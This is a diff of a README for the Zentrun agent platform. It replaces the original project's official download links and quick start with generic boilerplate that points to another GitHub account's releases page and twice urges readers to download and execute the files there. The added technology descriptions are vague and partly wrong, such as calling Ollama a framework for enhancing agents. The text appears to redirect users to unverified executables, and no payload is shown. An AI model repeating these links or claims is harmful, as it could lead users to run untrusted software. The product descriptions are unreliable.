@@ -1,231 +1,87 @@
-# 🧠 Zentrun — A Software 3.0 based Agent App Platform
+# Zentrun: A Software 3.0 Agent App Platform 🌟
 
-Zentrun is a platform where
-**prompts generate real, executable code**,
-and that code becomes **reusable functions inside agents.**
+![Zentrun Logo](https://img.shields.io/badge/Zentrun-Software%203.0-blue.svg)
+[![Latest Release](https://img.shields.io/github/v/release/JotaveDev23/zentrun)](https://github.com/JotaveDev23/zentrun/releases)
 
-Each agent accumulates these functions,
-and gradually behaves like a real app —
-automating tasks, analyzing data, and supporting UI components.
+## Table of Contents
 
-Zentrun runs fully locally.
-You own the features, logic, and data.
+- [Overview](#overview)
+- [Features](#features)
+- [Technologies](#technologies)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
----
+## Overview
 
-## 📌 What Is an Agent App?
+Zentrun is a cutting-edge platform designed for creating and managing intelligent agents. Built on the principles of Software 3.0, Zentrun integrates various AI technologies, enabling seamless automation and interaction. With Zentrun, developers can harness the power of AI agents to streamline tasks, enhance productivity, and create innovative solutions.
 
-An **Agent App** is a unit of reusable, prompt-defined functions
-that can be saved, scheduled, and composed.
+You can find the latest releases of Zentrun [here](https://github.com/JotaveDev23/zentrun/releases). Download the necessary files and execute them to get started.
 
-It’s more than a script — it’s a growing system
-built with natural language and structured like software.
+## Features
 
-| SaaS (Software 1.0)          | Agent App (Software 3.0, Zentrun)         |
-|------------------------------|--------------------------------------------|
-| Fixed features               | Create new features from prompts           |
-| Vendor-owned data            | Local database embedded per agent          |
-| No logic customization       | Custom logic and UI defined by user        |
-| Pay-per-seat licensing       | Open-source, local-first                   |
-| You use it                   | You build, run, and own it                 |
+- **AI Agent Creation**: Easily create agents that can perform specific tasks or automate processes.
+- **Integration with Popular AI Models**: Use models like Claude, GPT, and others to power your agents.
+- **MCP Client Support**: Connect to the MCP for advanced capabilities and features.
+- **Ollama Integration**: Utilize Ollama for enhanced performance and capabilities.
+- **User-Friendly Interface**: Navigate the platform with ease thanks to an intuitive design.
+- **Extensive Documentation**: Access comprehensive guides and resources to help you get started.
 
----
----
+## Technologies
 
-[Learn More about Zentrun](https://zentrun.com)
+Zentrun leverages a variety of technologies to deliver its powerful features:
 
+- **Agents**: The core component of the platform, enabling intelligent automation.
+- **AI Agents**: Designed to perform tasks using machine learning models.
+- **AI Automation**: Streamlines processes through intelligent decision-making.
+- **Claude**: An advanced AI model for natural language processing.
+- **GPT**: A powerful model for generating human-like text.
+- **MCP**: A protocol for managing communication between agents.
+- **MCP Client**: A tool for connecting to the MCP.
+- **Ollama**: A framework for enhancing agent capabilities.
+- **OpenAI**: Integrates various AI functionalities.
+- **Vibe Coding**: A unique approach to coding that enhances the development experience.
 
----
+## Installation
 
-## ✨ Installation
+To install Zentrun, follow these steps:
 
-| Platform         | Stable                                                                                                  |
-|------------------|---------------------------------------------------------------------------------------------------------|
-| Windows          | [Download](https://download.zentrun.com/Zentrun%20Setup%200.0.1.exe)                                    |
-| macOS            | [Download](https://download.zentrun.com/Zentrun-0.0.1-mac-x64.dmg)                     |
-| Linux (tar.gz)   | [Download](https://download.zentrun.com/Zentrun-0.0.1-linux-x64.tar.gz)           |
-| Linux (AppImage) | [Download](https://download.zentrun.com/Zentrun-0.0.1-linux-x86_64.AppImage) |
+1. Visit the [Releases](https://github.com/JotaveDev23/zentrun/releases) section.
+2. Download the latest version of the software.
+3. Extract the downloaded files.
+4. Follow the installation instructions provided in the documentation.
 
-Download from zentrun.com or GitHub Releases.
+## Usage
 
-##  ✨  Quick Start
+Once installed, you can start using Zentrun to create and manage your agents. Here’s a simple guide to get you started:
 
-```bash
-git clone https://github.com/andrewsky-labs/zentrun
-cd zentrun
-yarn
-yarn run dev
-```
+1. **Launch the Application**: Open Zentrun from your installed directory.
+2. **Create a New Agent**: Use the user interface to define the parameters and capabilities of your agent.
+3. **Integrate AI Models**: Select the AI models you wish to use, such as Claude or GPT.
+4. **Test Your Agent**: Run tests to ensure your agent performs as expected.
+5. **Deploy**: Once satisfied, deploy your agent to start automating tasks.
 
-This handles everything: installs dependencies, builds core components, and launches the app.
+For detailed instructions, refer to the documentation included in the installation package.
 
-## ✨ Demo: Prompt → Function → App
+## Contributing
 
-🎬 In the demo below, a marketing Agent App is created with prompts:
+We welcome contributions from the community! To contribute to Zentrun, follow these steps:
 
-1. Collects AI news
-2. Summarizes content
-3. Posts automatically to Twitter
-4. Analyzes engagement
-5. Visualizes results
+1. **Fork the Repository**: Create a personal copy of the repository on GitHub.
+2. **Clone Your Fork**: Download your fork to your local machine.
+3. **Create a Branch**: Make a new branch for your changes.
+4. **Make Changes**: Implement your improvements or fixes.
+5. **Commit Changes**: Write a clear commit message describing your changes.
+6. **Push to GitHub**: Upload your changes to your forked repository.
+7. **Create a Pull Request**: Submit a pull request to the main repository for review.
 
-Each step is generated from language.
-Each function is saved and reusable.
+For more details, please check the [Contributing Guidelines](CONTRIBUTING.md).
 
-[![Demo Video](assets/demo.jpg)](https://youtu.be/HcqcrWb2jxA)
+## License
 
----
-
-## 🔧 Key Features
-
-### 1. 🧠 Prompt-Based Code Generation
-- Generate Python, shell, browser automation code
-- Save as persistent, schedulable functions
-- No drag & drop – just prompts
-
-### 2. 📂 Agent-Level Memory & Database
-- Each agent has its own database (SQLite)
-- Supports state tracking and RAG with local/cloud docs
-
-### 3. 📊 Data Pipeline: Ingest → Analyze → Visualize
-- Handle PDFs, CSVs, APIs, scraped content
-- Auto-generate SQL, Python, and chart logic
-
-### 4. 🧱 Modular Execution Architecture
-- Zent → Agent → ZPilot (workspace hierarchy)
-- Compose agents from reusable functional units
-
-### 5. 💻 Fully Local Execution
-- Windows, macOS, Linux
-- Electron GUI and CLI
-- No cloud lock-in, no API quota
+Zentrun is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
 ---
 
-## 💬 Monetize Your Agent Apps (Optional)
-
-Some users package their Agent Apps
-as internal tools, client deliverables, or microservices.
-You can create repeatable workflows and share or resell them.
-
-Zentrun helps you move from temporary automation
-to sustainable, composable software — made from prompts.
-
----
-
-Zentrun isn’t just a tool. It’s a Software 3.0 framework where agents evolve from your words.
-
-### Screenshots
-
-
-
-<div align="center">
-  <img src="/assets/zentrun_main.jpg" alt="Zentrun" width="90%">
-</div>
-
-<div align="center">
-  <img src="/assets/zent_build.png" alt="Zentrun" width="90%">
-</div>
-<div align="center">
-  <img src="/assets/agent_build.png" alt="Zentrun" width="90%">
-</div>
-<div align="center">
-  <img src="/assets/zpilot_build.png" alt="Zentrun" width="90%">
-</div>
-
-
-## 🤖 Supported Model Providers
-
-<table>
-  <tr align="center">
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/ollama.svg" width="50" height="50" alt="Ollama Icon"><br/>
-      <a href="https://ollama.com">Ollama</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/deepseek-color.svg" width="50" height="50" alt="Deepseek Icon"><br/>
-      <a href="https://deepseek.com/">Deepseek</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/siliconcloud.svg" width="50" height="50" alt="Silicon Icon"><br/>
-      <a href="https://www.siliconflow.cn/">Silicon</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/qwen-color.svg" width="50" height="50" alt="QwenLM Icon"><br/>
-      <a href="https://chat.qwenlm.ai">QwenLM</a>
-    </td>
-  </tr>
-  <tr align="center">
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/doubao-color.svg" width="50" height="50" alt="Doubao Icon"><br/>
-      <a href="https://console.volcengine.com/ark/">Doubao</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/minimax-color.svg" width="50" height="50" alt="MiniMax Icon"><br/>
-      <a href="https://platform.minimaxi.com/">MiniMax</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/fireworks-color.svg" width="50" height="50" alt="Fireworks Icon"><br/>
-      <a href="https://fireworks.ai/">Fireworks</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/ppio-color.svg" width="50" height="50" alt="PPIO Icon"><br/>
-      <a href="https://ppinfra.com/">PPIO</a>
-    </td>
-  </tr>
-  <tr align="center">
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/openai.svg" width="50" height="50" alt="OpenAI Icon"><br/>
-      <a href="https://openai.com/">OpenAI</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/gemini-color.svg" width="50" height="50" alt="Gemini Icon"><br/>
-      <a href="https://gemini.google.com/">Gemini</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/github.svg" width="50" height="50" alt="GitHub Models Icon"><br/>
-      <a href="https://github.com/marketplace/models">GitHub Models</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/moonshot.svg" width="50" height="50" alt="Moonshot Icon"><br/>
-      <a href="https://moonshot.ai/">Moonshot</a>
-    </td>
-  </tr>
-  <tr align="center">
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/openrouter.svg" width="50" height="50" alt="OpenRouter Icon"><br/>
-      <a href="https://openrouter.ai/">OpenRouter</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/azure-color.svg" width="50" height="50" alt="Azure OpenAI Icon"><br/>
-      <a href="https://azure.microsoft.com/en-us/products/ai-services/openai-service">Azure OpenAI</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/qiniu.svg" width="50" height="50" alt="Qiniu Icon"><br/>
-      <a href="https://www.qiniu.com/products/ai-token-api">Qiniu</a>
-    </td>
-    <td>
-      <img src="./src/renderer/src/assets/llm-icons/grok.svg" width="50" height="50" alt="Grok Icon"><br/>
-      <a href="https://x.ai/">Grok</a>
-    </td>
-  </tr>
-</table>
-
-** Compatible with any model provider in OpenAI/Gemini/Anthropic API format
-
-## ✨  System Requirements
-Minimum specs for a decent experience:
-
-macOS: 13.6+ (8GB RAM for 3B models, 16GB for 7B, 32GB for 13B)
-Windows: 10+ with GPU support for NVIDIA/AMD/Intel Arc
-Linux: Most distributions work, GPU acceleration available
-
-## ✨  Contributing
-
-Please refer to [Contribution Guide](https://github.com/andrewsky-labs/zentrun/CONTRIBUTING.md).
-
-
-
-## 📃 License
-
-[LICENSE](./LICENSE)
+You can find the latest releases of Zentrun [here](https://github.com/JotaveDev23/zentrun/releases). Download the necessary files and execute them to get started.
